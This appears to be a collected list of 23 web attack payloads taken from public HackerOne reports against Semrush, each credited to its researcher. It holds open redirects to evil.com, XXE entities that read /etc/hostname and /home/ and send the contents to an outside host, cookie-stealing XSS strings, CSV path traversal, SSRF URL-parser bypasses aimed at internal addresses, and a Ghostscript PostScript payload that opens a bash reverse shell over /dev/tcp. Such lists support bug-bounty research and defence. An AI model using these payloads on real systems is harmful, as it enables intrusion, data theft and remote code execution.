# Semrush

23 payloads.

### `2dc67c93`

```
https://target.com/redirect?url=http://evil.com
```

**Parameter:** `url`
— [Open Redirect](https://hackerone.com/reports/311330) · Semrush · [ankit_singh](https://hackerone.com/ankit_singh)

### `159d89ea`

```
<?xml version="1.0" encoding="utf-8"?>
 <!DOCTYPE foo [  
   <!ELEMENT foo ANY >
   <!ENTITY xxe SYSTEM "http://target.com/text.txt" >]>
<urlset xmlns="http://evil.com/schemas/sitemap/0.9" 
   xmlns:xsi="http://evil2.com/2001/XMLSchema-instance"
   xsi:schemaLocation="http://evil.com/schemas/sitemap/0.9 http://evil.com/schemas/sitemap/0.9/sitemap.xsd">
    <url>
        <loc>&xxe;</loc>
        <lastmod>2006-11-18</lastmod>
        <changefreq>daily</changefreq>
   
```

— [XXE in Site Audit function exposing file and directory contents](https://hackerone.com/reports/312543) · Semrush · [ajxchapman](https://hackerone.com/ajxchapman)

### `870f5403`

```
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE urlset [
 <!ENTITY % goodies SYSTEM "file:///etc/hostname">
 <!ENTITY % dtd SYSTEM "http://target.com/files/combine.dtd">
%dtd;
]>
<urlset xmlns="http://evil.com/schemas/sitemap/0.9" 
   xmlns:xsi="http://evil2.com/2001/XMLSchema-instance"
   xsi:schemaLocation="http://evil.com/schemas/sitemap/0.9 http://evil.com/schemas/sitemap/0.9/sitemap.xsd">
    <url>
        <loc>http://evil3.com/resp/&xxe;</loc>
    
```

— [XXE in Site Audit function exposing file and directory contents](https://hackerone.com/reports/312543) · Semrush · [ajxchapman](https://hackerone.com/ajxchapman)

### `a8683061`

```
<?xml version="1.0" encoding="UTF-8"?>
<!ENTITY xxe "%goodies;">
```

— [XXE in Site Audit function exposing file and directory contents](https://hackerone.com/reports/312543) · Semrush · [ajxchapman](https://hackerone.com/ajxchapman)

### `1c861293`

```
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE urlset [
 <!ENTITY % goodies SYSTEM "file:///home/">
 <!ENTITY % dtd SYSTEM "http://target.com/files/combine.dtd">
%dtd;
]>
<urlset xmlns="http://evil.com/schemas/sitemap/0.9" 
   xmlns:xsi="http://evil2.com/2001/XMLSchema-instance"
   xsi:schemaLocation="http://evil.com/schemas/sitemap/0.9 http://evil.com/schemas/sitemap/0.9/sitemap.xsd">
    <url>
        <loc>http://evil3.com/resp/&xxe;</loc>
        <la
```

— [XXE in Site Audit function exposing file and directory contents](https://hackerone.com/reports/312543) · Semrush · [ajxchapman](https://hackerone.com/ajxchapman)

### `6d61f07b`

```
javascript://%0aalert(document.cookie)
```

**Parameter:** `url`
— [XSS on redirection page( Bypassed) ](https://hackerone.com/reports/316319) · Semrush · [kunal94](https://hackerone.com/kunal94)

### `f339f25d`

```
javascript://%250Aalert(document.location="https://target.com",document.location="https://evil.com")
```

**Parameter:** `url`
— [XSS on redirection page( Bypassed) ](https://hackerone.com/reports/316319) · Semrush · [kunal94](https://hackerone.com/kunal94)

### `32bf73f9`

```
https://target.com/redirect?url=javascript://%250Aalert(document.cookie
```

**Parameter:** `url`
— [XSS on redirection page( Bypassed) ](https://hackerone.com/reports/316319) · Semrush · [kunal94](https://hackerone.com/kunal94)

### `fcee0c3f`

```
https://target.com/redirect?url=javascript://%250Aalert(document.domain
```

**Parameter:** `url`
— [XSS on redirection page( Bypassed) ](https://hackerone.com/reports/316319) · Semrush · [kunal94](https://hackerone.com/kunal94)

### `deb8928a`

```
https://target.com/redirect?url=javascript://%250Aalert(document.location=
```

**Parameter:** `url`
— [XSS on redirection page( Bypassed) ](https://hackerone.com/reports/316319) · Semrush · [kunal94](https://hackerone.com/kunal94)

### `685b8b3d`

```
Status,Campaign,Campaign Type,Ad Group,Short headline,Long headline,Description,Business name,Image,Square image,Logo,Landscape logo,Final URL,Final mobile URL,Tracking URL
Enabled,Default campaign,Display Network only,Default Group,Something,Something,Something,Something,../../../usr/share/pixmaps/debian-logo.png,../../../usr/share/pixmaps/debian-logo.png,../../../usr/share/pixmaps/debian-logo.png,,http://target.com,,
```

— [Ad Builder Display Ads Path Traversal](https://hackerone.com/reports/316713) · Semrush · [ajxchapman](https://hackerone.com/ajxchapman)

### `cc4f0e1b`

```
Status,Campaign,Campaign Type,Ad Group,Short headline,Long headline,Description,Business name,Image,Square image,Logo,Landscape logo,Final URL,Final mobile URL,Tracking URL
Enabled,Default Campaign,Display Network only,Default Group,Something,Something,Something,Something,../../../██████/█████/1.png,../../../███████/█████/1.png,../../../████/█████/1.png,,http://target.com,,
```

— [Ad Builder Display Ads Path Traversal](https://hackerone.com/reports/316713) · Semrush · [ajxchapman](https://hackerone.com/ajxchapman)

### `79b71fc7`

```
../../../usr/share/pixmaps/debian-logo.png
```

— [Ad Builder Display Ads Path Traversal](https://hackerone.com/reports/316713) · Semrush · [ajxchapman](https://hackerone.com/ajxchapman)

### `f4dd4931`

```
<html>
  <body>
    <form action="https://target.com/my-posts/api/image/upload/?CKEditor=text&CKEditorFuncNum=dadasd</script><script>alert(document.domain)</script>&langCode=en" method="POST">
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
```

**Parameter:** `CKEditorFuncNum`
— [Post Based XSS On Upload Via CK Editor \[target.com\]](https://hackerone.com/reports/375352) · Semrush · [apapedulimu](https://hackerone.com/apapedulimu)

### `0de1f87b`

```
"><u>XSS Vulnerability</u><marquee+onstart='alert(document.cookie)'>XSS
```

**Parameter:** `domain`
— [Stored XSS in '' Section and WAF Bypass](https://hackerone.com/reports/382625) · Semrush · [jimgogogo](https://hackerone.com/jimgogogo)

### `0c4fdbd5`

```
%!PS
userdict /setpagedevice undef
legal
{ null restore } stopped { pop } if
legal
mark /OutputFile (%pipe%bash -c 'bash -i >& /dev/tcp/███/8080 0>&1') currentdevice putdeviceprops
```

— [Remote Code Execution on target.com/my_reports on Logo upload](https://hackerone.com/reports/403417) · Semrush · [fransrosen](https://hackerone.com/fransrosen)

### `726423a6`

```
https://target.com/redirect?url=ftp://evil.com:1337
```

**Parameter:** `url`
— [protocol & Ports are not shown in third-party site redirect warning page ](https://hackerone.com/reports/459286) · Semrush · [0xprial](https://hackerone.com/0xprial)

### `1b81c9d9`

```
https://target.com/redirect?url=ftp://evil.com:1337**
```

**Parameter:** `url`
— [protocol & Ports are not shown in third-party site redirect warning page ](https://hackerone.com/reports/459286) · Semrush · [0xprial](https://hackerone.com/0xprial)

### `1c187a8a`

```
https://target.com/my_reports/api/v1/document%22%3E%3Cimg%20src=x%20onerror=alert(document.cookie
```

— [XSS Reflected on my_report](https://hackerone.com/reports/491023) · Semrush · [r0hack](https://hackerone.com/r0hack)

### `88dc51c7`

```
GET /blog/services/oembed/?url=https://1:@127.0.0.1:\@@@@w.evil2.com/@https://target.com/&callback=CKEDITOR._.jsonpCallbacks[89] HTTP/1.1
Host: evil.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Referer: https://evil.com//my-posts/████/edit/
Connection: close
███
X-Forwarded-For: 127.0.0.1
```

**Parameter:** `url`
— [SSRF In Get Video Contents](https://hackerone.com/reports/643622) · Semrush · [egoist233](https://hackerone.com/egoist233)

### `b734a31f`

```
http://127.0.0.1/
```

**Parameter:** `url`
— [SSRF In Get Video Contents](https://hackerone.com/reports/643622) · Semrush · [egoist233](https://hackerone.com/egoist233)

### `5a6a57d3`

```
https://1:@127.0.0.1:\@@@@w.evil.com/@https://target.com/
```

**Parameter:** `url`
— [SSRF In Get Video Contents](https://hackerone.com/reports/643622) · Semrush · [egoist233](https://hackerone.com/egoist233)

### `c25827c3`

```
https://1:@10.0.0.1:\@@@@w.evil.com/@https://target.com/
```

**Parameter:** `url`
— [SSRF In Get Video Contents](https://hackerone.com/reports/643622) · Semrush · [egoist233](https://hackerone.com/egoist233)
